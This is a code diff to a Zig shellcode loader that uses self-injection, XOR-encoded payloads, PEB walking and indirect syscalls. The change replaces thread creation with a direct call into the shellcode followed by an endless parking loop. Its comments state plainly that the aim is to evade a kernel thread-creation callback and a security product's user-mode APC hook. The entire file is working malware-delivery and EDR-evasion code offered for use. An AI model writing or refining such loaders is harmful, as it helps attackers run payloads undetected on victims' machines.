@@ -1,5 +1,9 @@
 // hells gate shellcode loader. self-injection, per-build random xor key, peb walk.
 // FreshyCalls SSN resolution + indirect syscalls with random gadget pool.
+// execution: direct call on the main thread, then park forever.
+// no new thread (PsSetCreateThreadNotifyRoutineEx flags start addresses outside
+// image memory), no APC (hmpalert.dll hooks ntdll!KiUserApcDispatcher — a
+// user-mode delivery point, unreachable by syscall or ETW tricks).
 const std = @import("std");
 const windows = std.os.windows;
 const nt = @import("nt.zig");
@@ -89,24 +93,18 @@ pub fn main() void {
     ok("memory protected to RX", .{});
     jitter(5, 15);
 
-    // spawn thread at shellcode entry.
-    var thread_handle: windows.HANDLE = undefined;
-    _ = syscall.syscall_dispatch(
-        g_sys.NtCreateThreadEx.number,
-        &[_]usize{
-            @intFromPtr(&thread_handle), nt.THREAD_ALL_ACCESS, 0,
-            @intFromPtr(current_process), @intFromPtr(base_addr), 0,
-            0, 0, 0, 0, 0,
-        },
-        11,
-    );
-    ok("thread created, waiting for completion", .{});
+    // direct call on the main thread. if the payload starts its own threads and
+    // returns (Donut does), park this thread forever so the process stays alive.
+    // alertable=0 — no APC can ever be delivered on this thread again.
+    info("executing shellcode on main thread", .{});
+    const entry: *const fn () callconv(.c) void = @ptrCast(base_addr);
+    entry();
 
-    _ = syscall.syscall_dispatch(
-        g_sys.NtWaitForSingleObject.number,
-        &[_]usize{ @intFromPtr(thread_handle), 0, 0 },
-        3,
-    );
+    info("shellcode returned, parking thread", .{});
+    const day: i64 = -@as(i64, 24 * 60 * 60 * 10_000_000);
+    while (true) {
+        _ = syscall.syscall_dispatch(g_sys.NtDelayExecution.number, &[_]usize{ 0, @intFromPtr(&day) }, 2);
+    }
 }
 
 // pseudorandom sleep between stages. not crypto, just noise.
